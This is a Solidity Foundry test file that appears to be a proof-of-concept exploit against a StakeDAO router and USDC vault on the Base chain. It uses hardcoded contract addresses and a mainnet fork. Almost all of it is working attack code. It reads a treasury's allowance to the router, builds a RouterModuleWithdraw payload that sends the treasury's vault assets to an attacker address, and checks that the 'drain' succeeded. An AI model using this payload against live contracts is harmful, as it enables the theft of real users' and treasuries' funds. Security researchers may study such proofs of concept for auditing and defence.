// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IRouter {
    function execute(bytes[] calldata calls) external payable returns (bytes[] memory);
}

interface IERC4626 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

contract StakeDAOFinal is Test {
    IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);
    IERC4626 constant vault = IERC4626(0x8EDCC305E633d29BFB383872e79401c506cE9E6f); // STAKEDAO_VAULT_USDC_V2
    address constant ALLMIGHT = 0xDBd24b092f686b12650EC1450e3A7138F714506c;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
    }

    function testDrainVault() public {
        address attacker = address(0xBAD);

        // 1. Check the Router's allowance from the Treasury (ALLMIGHT)
        uint256 routerAllowance = vault.allowance(ALLMIGHT, address(router));
        console.log("Router Allowance from ALLMIGHT:", routerAllowance);

        // 2. Check how many shares ALLMIGHT owns
        uint256 allMightShares = vault.balanceOf(ALLMIGHT);
        uint256 assetsToSteal = vault.convertToAssets(allMightShares);
        
        console.log("ALLMIGHT Shares:", allMightShares);
        console.log("Assets to steal:", assetsToSteal);

        require(assetsToSteal > 0, "Nothing to steal in this vault");

        // 3. Craft the payload for Module 0x01 (RouterModuleWithdraw)
        // We are instructing the router to withdraw ALLMIGHT's funds to us.
        bytes memory payload = abi.encodePacked(
            bytes1(uint8(1)), // Module ID 0x01 = RouterModuleWithdraw
            abi.encodeWithSignature(
                "withdraw(address,uint256,address,address)",
                address(vault),     // vault address
                assetsToSteal,      // amount to withdraw
                attacker,           // receiver (us)
                ALLMIGHT            // owner (the treasury)
            )
        );

        bytes[] memory calls = new bytes[](1);
        calls[0] = payload;

        // 4. Impersonate the attacker and execute
        vm.prank(attacker);
        console.log("Executing drain...");

        try router.execute(calls) {
            uint256 attackerBalance = IERC20(USDC).balanceOf(attacker);
            console.log("Attacker USDC Balance after drain:", attackerBalance);
            assertEq(attackerBalance, assetsToSteal, "Drain failed");
            console.log("SUCCESS: Vault drained!");
        } catch Error(string memory reason) {
            console.log("Drain reverted with reason:", reason);
            revert("Drain failed");
        } catch (bytes memory) {
            console.log("Drain reverted with custom error (Check if ALLMIGHT approved the Router)");
            revert("Drain failed");
        }
    }
}
